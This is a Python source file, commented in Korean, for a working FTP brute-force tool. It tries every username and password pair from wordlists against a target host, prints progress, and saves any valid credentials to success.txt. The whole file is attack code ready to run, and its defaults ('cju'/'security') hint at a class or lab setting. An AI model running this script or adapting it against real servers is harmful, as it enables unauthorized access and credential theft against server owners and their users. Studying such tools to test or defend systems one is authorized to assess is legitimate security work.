import sys
import argparse
import os
from typing import List
from ftplib import FTP, error_perm
import time
from datetime import datetime

class FTPBruteforcer:
    def __init__(self, host: str):
        self.host = host
        self.success = False
        self.valid_credentials = None

    def try_login(self, username: str, password: str) -> bool:
        """FTP 로그인 시도"""
        try:
            with FTP(self.host, timeout=5) as ftp:
                ftp.login(user=username, passwd=password)
                self.success = True
                self.valid_credentials = (username, password)
                return True
        except error_perm:
            return False
        except Exception as e:
            print(f"에러 발생: {str(e)}")
            return False

    def bruteforce_attack(self, usernames: List[str], passwords: List[str], delay: float = 1.0):
        """무작위 대입 공격 실행"""
        total = len(usernames) * len(passwords)
        current = 0
        start_time = time.time()
        
        print(f"\n[*] 대입 공격 시작: {self.host}")
        print(f"[*] 총 시도 횟수: {total}\n")
        
        for username in usernames:
            for password in passwords:
                current += 1
                print(f"\r진행률: {current}/{total} ({current/total*100:.1f}%) - 현재: {username}:{password}", end="")
                
                if self.try_login(username, password):
                    elapsed = time.time() - start_time
                    print(f"\n\n[+] 성공! 유효한 자격 증명을 찾았습니다!")
                    print(f"[+] 호스트: {self.host}")
                    print(f"[+] 사용자: {username}")
                    print(f"[+] 암호: {password}")
                    print(f"[+] 소요 시간: {elapsed:.1f}초")
                    
                    # 결과를 파일에 저장
                    with open("success.txt", "a") as f:
                        f.write(f"\n[{datetime.now()}] {self.host}:{username}:{password}")
                    
                    return True
                
                time.sleep(delay)  # 서버 부하 방지를 위한 대기
        
        print("\n\n[-] 공격 실패: 유효한 자격 증명을 찾지 못했습니다.")
        return False

def load_wordlist(filename: str) -> List[str]:
    """워드리스트 파일 로드"""
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"워드리스트 파일 로드 실패: {str(e)}")
        sys.exit(1)

def parse_arguments():
    """커맨드 라인 인자 파싱"""
    parser = argparse.ArgumentParser(description='FTP Bruteforce Tool')
    parser.add_argument('-H', '--host', required=True, help='FTP 서버 주소')
    parser.add_argument('-U', '--userlist', help='사용자명 리스트 파일')
    parser.add_argument('-P', '--passlist', help='비밀번호 리스트 파일')
    parser.add_argument('-u', '--user', help='단일 사용자명')
    parser.add_argument('-p', '--password', help='단일 비밀번호')
    parser.add_argument('-d', '--delay', type=float, default=1.0, help='시도 간 대기 시간(초)')
    
    args = parser.parse_args()
    
    # 현재 스크립트의 절대 경로를 기준으로 워드리스트 파일 경로 설정
    base_path = os.path.dirname(os.path.abspath(__file__))
    wordlist_path = os.path.join(base_path)
    
    # 사용자명과 비밀번호 준비
    if args.user:
        usernames = [args.user]
    elif args.userlist:
        userlist_file = os.path.join(wordlist_path, args.userlist)
        print(f"사용자 리스트 파일 경로: {userlist_file}")
        usernames = load_wordlist(userlist_file)
    else:
        usernames = ['cju']
        
    if args.password:
        passwords = [args.password]
    elif args.passlist:
        passlist_file = os.path.join(wordlist_path, args.passlist)
        print(f"비밀번호 리스트 파일 경로: {passlist_file}")
        passwords = load_wordlist(passlist_file)
    else:
        passwords = ['security']
    
    return args.host, usernames, passwords, args.delay

def main():
    print("""
    ===================================
    FTP 무작위 대입 공격 도구
    ===================================
    """)
    
    # 인자 파싱
    host, usernames, passwords, delay = parse_arguments()
    
    # 대입 공격 실행
    bruteforcer = FTPBruteforcer(host)
    bruteforcer.bruteforce_attack(usernames, passwords, delay)

if __name__ == "__main__":
    main()